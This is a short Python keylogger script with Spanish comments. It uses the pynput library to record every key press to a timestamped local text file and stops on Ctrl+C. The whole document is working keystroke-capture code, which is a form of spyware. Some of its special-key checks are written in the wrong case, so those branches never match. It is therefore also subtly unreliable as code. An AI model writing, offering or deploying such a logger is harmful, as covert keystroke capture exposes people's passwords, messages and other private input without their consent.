import datetime
#instalar pynput con pip install pynput
from pynput.keyboard import Listener
#registramos la fecha y la hora Año, mes, dia, Hora, Minutos, Segundos
dte = datetime.datetime.now().strftime('%Y-%m-%d %H-%M-%S')
#Cada archvio que cree se guardara con la fecha de creación
#damos permisos de escritura con w
file = open(f'keylogger_{dte}.txt', 'w')

def register(key):

    key = str(key)
    if key == "'\\x03'": #Significa Ctrl+C para parar el keylogger
        file.close()
        quit()
    elif key == 'key.enter':  #Si se presiona enter se escribe un salto de linea
        file.write('\n')
    elif key == 'key.space': #Si se preciona space se escribe ' '
        file.write(' ')
    elif key == 'key.backspace': #Si se preciona delete se escribe %DEL% en el archivo
        file.write('%DELETE%')
    else:
        file.write(key.replace("'",""))


with Listener(on_press=register) as a:
    a.join()
